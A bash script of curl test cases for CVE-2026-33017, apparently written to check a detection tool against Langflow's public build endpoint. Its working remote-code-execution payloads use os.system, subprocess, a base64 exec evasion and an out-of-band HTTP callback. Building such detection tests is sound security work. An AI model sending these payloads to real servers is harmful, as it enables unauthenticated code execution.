#!/usr/bin/env bash
# tests/curl_tests.sh
# ───────────────────
# curl-based test cases for CVE-2026-33017.
# Each command is self-contained and can be run independently.
#
# Usage:
#   chmod +x tests/curl_tests.sh
#   ./tests/curl_tests.sh
#
# Env overrides:
#   LANGFLOW_URL=http://localhost:7860
#   FLOW_ID=<uuid>          # override auto-detected flow ID
#   OOB_HOST=abc.oast.me    # required for TC-08/09/10

set -euo pipefail

BASE="${LANGFLOW_URL:-http://localhost:7860}"
USER="${LANGFLOW_USER:-admin}"
PASS="${LANGFLOW_PASS:-testpass123}"
OOB="${OOB_HOST:-YOUR.OOB.HOST}"

# ── Auth ──────────────────────────────────────────────────────────────────────
echo "[*] Authenticating..."
TOKEN=$(curl -sf -X POST "$BASE/api/v1/login" \
  -H "Content-Type: application/json" \
  -d "{\"username\":\"$USER\",\"password\":\"$PASS\"}" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
echo "[*] Token: ${TOKEN:0:20}..."

# ── Flow ID ───────────────────────────────────────────────────────────────────
if [ -n "${FLOW_ID:-}" ]; then
  FIDS_ECHO="$FLOW_ID"
else
  echo "[*] Loading flow IDs from container..."
  IDS=$(docker exec langflow cat /data/flow_ids.json 2>/dev/null || echo "{}")
  FIDS_ECHO=$(echo "$IDS" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('echo_chat',''))" 2>/dev/null || echo "")
  if [ -z "$FIDS_ECHO" ]; then
    echo "[!] Could not get flow ID. Set FLOW_ID env var or ensure bootstrap completed."
    exit 1
  fi
fi
echo "[*] Flow ID: $FIDS_ECHO"
echo ""

# ── Helper ────────────────────────────────────────────────────────────────────
run_test() {
  local tc="$1" desc="$2"
  shift 2
  echo "── $tc: $desc"
  HTTP_STATUS=$(curl -so /dev/null -w "%{http_code}" "$@")
  if [[ "$HTTP_STATUS" =~ ^(200|201|202)$ ]]; then
    echo "   [✓] HTTP $HTTP_STATUS — endpoint accepted payload (vulnerable)"
  else
    echo "   [✗] HTTP $HTTP_STATUS — payload rejected (possibly patched)"
  fi
  echo ""
}

# ══════════════════════════════════════════════════════════════════════════════
# TC-01a — Baseline: legitimate public build (no data param)
# Your tool should NOT alert on this.
# ══════════════════════════════════════════════════════════════════════════════
echo "── TC-01a: Baseline legitimate public build"
curl -s -o /dev/null -w "   HTTP %{http_code}\n" \
  -X POST "$BASE/api/v1/build_public_tmp/$FIDS_ECHO/flow" \
  -H "Content-Type: application/json" \
  -d '{"inputs":[{"input_value":"Hello baseline","components":[]}]}'
echo "   → Your tool should NOT alert on this"
echo ""

# ══════════════════════════════════════════════════════════════════════════════
# TC-01b — Baseline: authenticated /run
# ══════════════════════════════════════════════════════════════════════════════
echo "── TC-01b: Authenticated /run (not the exploit path)"
curl -s -o /dev/null -w "   HTTP %{http_code}\n" \
  -X POST "$BASE/api/v1/run/$FIDS_ECHO" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"input_value":"baseline test","input_type":"chat","output_type":"chat"}'
echo "   → Your tool should NOT alert on this"
echo ""

# ══════════════════════════════════════════════════════════════════════════════
# TC-02 — Basic RCE: os.system canary file write
# ══════════════════════════════════════════════════════════════════════════════
CANARY_02="CVE-2026-33017-$(openssl rand -hex 6)"
run_test "TC-02" "Basic RCE — os.system canary write" \
  -X POST "$BASE/api/v1/build_public_tmp/$FIDS_ECHO/flow" \
  -H "Content-Type: application/json" \
  -d "{
    \"data\": {
      \"nodes\": [{
        \"id\": \"C-1\",
        \"type\": \"genericNode\",
        \"position\": {\"x\": 0, \"y\": 0},
        \"data\": {
          \"type\": \"CustomComponent\",
          \"node\": {
            \"display_name\": \"C\",
            \"description\": \"\",
            \"base_classes\": [\"Data\"],
            \"template\": {
              \"_type\": \"Component\",
              \"code\": {
                \"type\": \"code\",
                \"value\": \"import os\nfrom langflow.custom import CustomComponent\nfrom langflow.schema import Data\nclass C(CustomComponent):\n    display_name='C'\n    def build(self)->Data:\n        os.system(\\\"echo '$CANARY_02' > /tmp/canary_tc02.txt\\\")\n        return Data(data={})\"
              }
            }
          }
        }
      }],
      \"edges\": []
    }
  }"
echo "   Canary token: $CANARY_02"
echo "   Verify: docker exec langflow cat /tmp/canary_tc02.txt"
echo ""

# ══════════════════════════════════════════════════════════════════════════════
# TC-03 — Basic RCE: subprocess.run
# ══════════════════════════════════════════════════════════════════════════════
CANARY_03="CVE-2026-33017-$(openssl rand -hex 6)"
run_test "TC-03" "Basic RCE — subprocess.run canary write" \
  -X POST "$BASE/api/v1/build_public_tmp/$FIDS_ECHO/flow" \
  -H "Content-Type: application/json" \
  -d "{
    \"data\": {
      \"nodes\": [{
        \"id\": \"C-1\",
        \"type\": \"genericNode\",
        \"position\": {\"x\": 0, \"y\": 0},
        \"data\": {
          \"type\": \"CustomComponent\",
          \"node\": {
            \"display_name\": \"C\",
            \"description\": \"\",
            \"base_classes\": [\"Data\"],
            \"template\": {
              \"_type\": \"Component\",
              \"code\": {
                \"type\": \"code\",
                \"value\": \"import subprocess\nfrom langflow.custom import CustomComponent\nfrom langflow.schema import Data\nclass C(CustomComponent):\n    display_name='C'\n    def build(self)->Data:\n        subprocess.run(['sh','-c',\\\"echo '$CANARY_03' > /tmp/canary_tc03.txt\\\"])\n        return Data(data={})\"
              }
            }
          }
        }
      }],
      \"edges\": []
    }
  }"
echo "   Canary token: $CANARY_03"
echo "   Verify: docker exec langflow cat /tmp/canary_tc03.txt"
echo ""

# ══════════════════════════════════════════════════════════════════════════════
# TC-04 — Evasion: base64-encoded payload
# ══════════════════════════════════════════════════════════════════════════════
CANARY_04="CVE-2026-33017-$(openssl rand -hex 6)"
INNER_CMD="import os; os.system(\"echo '$CANARY_04' > /tmp/canary_tc04.txt\")"
B64_CMD=$(echo -n "$INNER_CMD" | base64 | tr -d '\n')
echo "── TC-04: Evasion — base64-encoded payload"
echo "   Encoded: $B64_CMD"
curl -s -o /dev/null -w "   HTTP %{http_code}\n" \
  -X POST "$BASE/api/v1/build_public_tmp/$FIDS_ECHO/flow" \
  -H "Content-Type: application/json" \
  -d "{
    \"data\": {
      \"nodes\": [{
        \"id\": \"C-1\",
        \"type\": \"genericNode\",
        \"position\": {\"x\": 0, \"y\": 0},
        \"data\": {
          \"type\": \"CustomComponent\",
          \"node\": {
            \"display_name\": \"C\",
            \"description\": \"\",
            \"base_classes\": [\"Data\"],
            \"template\": {
              \"_type\": \"Component\",
              \"code\": {
                \"type\": \"code\",
                \"value\": \"import base64\nfrom langflow.custom import CustomComponent\nfrom langflow.schema import Data\nclass C(CustomComponent):\n    display_name='C'\n    def build(self)->Data:\n        exec(base64.b64decode('$B64_CMD').decode())\n        return Data(data={})\"
              }
            }
          }
        }
      }],
      \"edges\": []
    }
  }"
echo ""

# ══════════════════════════════════════════════════════════════════════════════
# TC-08 — OOB: HTTP callback (requires OOB_HOST)
# ══════════════════════════════════════════════════════════════════════════════
if [ "$OOB" = "YOUR.OOB.HOST" ]; then
  echo "── TC-08/09/10: OOB tests — SKIPPED (set OOB_HOST env var)"
  echo ""
else
  CANARY_08="CVE-2026-33017-$(openssl rand -hex 6)"
  run_test "TC-08" "OOB HTTP callback → $OOB" \
    -X POST "$BASE/api/v1/build_public_tmp/$FIDS_ECHO/flow" \
    -H "Content-Type: application/json" \
    -d "{
      \"data\": {
        \"nodes\": [{
          \"id\": \"C-1\",
          \"type\": \"genericNode\",
          \"position\": {\"x\": 0, \"y\": 0},
          \"data\": {
            \"type\": \"CustomComponent\",
            \"node\": {
              \"display_name\": \"C\",
              \"description\": \"\",
              \"base_classes\": [\"Data\"],
              \"template\": {
                \"_type\": \"Component\",
                \"code\": {
                  \"type\": \"code\",
                  \"value\": \"import urllib.request\nfrom langflow.custom import CustomComponent\nfrom langflow.schema import Data\nclass C(CustomComponent):\n    display_name='C'\n    def build(self)->Data:\n        try: urllib.request.urlopen('http://$OOB/?canary=$CANARY_08',timeout=10)\n        except: pass\n        return Data(data={})\"
                }
              }
            }
          }
        }],
        \"edges\": []
      }
    }"
  echo "   Expected OOB callback: http://$OOB/?canary=$CANARY_08"
  echo ""
fi

echo "══ Done ══════════════════════════════════════════════════════"
echo "To verify canary files inside the container:"
echo "  docker exec langflow ls /tmp/canary_*.txt"
echo "  docker exec langflow cat /tmp/canary_tc02.txt"
